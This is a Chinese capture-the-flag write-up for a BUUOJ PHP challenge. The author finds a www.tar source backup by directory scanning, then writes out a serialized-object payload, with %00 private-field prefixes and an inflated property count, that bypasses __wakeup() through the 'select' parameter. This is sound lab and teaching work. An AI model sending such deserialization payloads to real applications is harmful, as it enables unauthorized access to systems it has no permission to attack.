### buuoj_[极客大挑战 2019]PHP（目录备份和反序列化）

题目说了有备份，先看看能不能找到备份文件，先用burp扫了一下目录没扫到，看了下大佬的wp，下了个dirsearch继续扫，感觉扫了一万年，目录也太多了

![](https://pic.imgdb.cn/item/6103f22e5132923bf8afd007.jpg)

![](https://pic.imgdb.cn/item/6103f2475132923bf8b023c5.jpg)

但是不知道为什么，我扫了两遍也没扫出www.zip，只有www.tar。。。

算了先下载下来看看

![](https://pic.imgdb.cn/item/6103f8095132923bf8c2b8e8.jpg)

有好几个文件，先挨着打开看看

很明显flag文件里面就是唬人的。。。

![](https://pic.imgdb.cn/item/6103f87a5132923bf8c4480d.jpg)

先看看class文件里面，函数_wakeup把username重新赋值，但是在destruct里面，当username='admin'，password='100'的时候输出flag

![](https://pic.imgdb.cn/item/6103f8fc5132923bf8c60fef.jpg)

再看看index文件里面，get一个select参数，

> **unserialize(str)** 对单一的已序列化的变量进行操作，将其转换回PHP的值。即反序列化函数
>
> 若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP会自动地试图去调用 [__wakeup()](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup)     成员函数（如果存在的话）。          

所以，首先要构造一句话，意思大概就是这样

```
username='admin';password=100;
```

然后将其序列化（本地的PHP环境好像有点问题）

![](https://pic.imgdb.cn/item/6103fab65132923bf8cc3d58.jpg)

可以看到输出的数值里面有%00存在

> private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度

所以可以得到

```
O:4:"Name":2:{s:14:%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

那么接下来就是如何避免执行_wakeup函数

> 在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行
>
> 因此我们将序列化这样设置

```
O:4:"Name":3:{s:14:%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

构造playload

```
http://f91b6afe-497c-47a9-adfc-5299d3bbb181.node4.buuoj.cn/?select=O:4:"Name":3:{s:14:%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

没成功，改了一下

```
?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}
```

![](https://pic.imgdb.cn/item/6103fcc95132923bf8d38e58.jpg)

